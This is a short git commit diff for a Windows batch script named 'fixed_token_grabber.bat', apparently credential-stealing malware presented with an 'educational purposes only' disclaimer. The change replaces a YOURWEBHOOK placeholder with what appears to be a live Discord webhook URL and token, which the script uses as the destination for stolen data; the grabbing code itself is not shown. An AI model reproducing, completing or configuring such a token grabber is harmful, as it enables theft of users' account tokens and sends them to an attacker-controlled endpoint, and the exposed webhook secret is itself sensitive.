5cc490da2c5ae19075825773dc6495840436558f
Marco <138619316+01234567876543210@users.noreply.github.com>
2023-07-22 04:04:56 +0200

    Update fixed_token_grabber.bat

--- fixed_token_grabber.bat
+++ fixed_token_grabber.bat
@@ -3,7 +3,7 @@
 @echo off
 :: i dont take any responsibility for damage done with the programm it's for educational purposes only
 ::replace the YOURWEBHOOK field with your webhook
-set webhook=YOURWEBHOOK
+set webhook=https://discord.com/api/webhooks/1132114551844909086/23B6pfCcCN7_JBh1R_BfxpkTgU83R0TN03ZR2TNEwu7tSudiZHRX-oEVXxBgiTwrgb2P
 
 
 
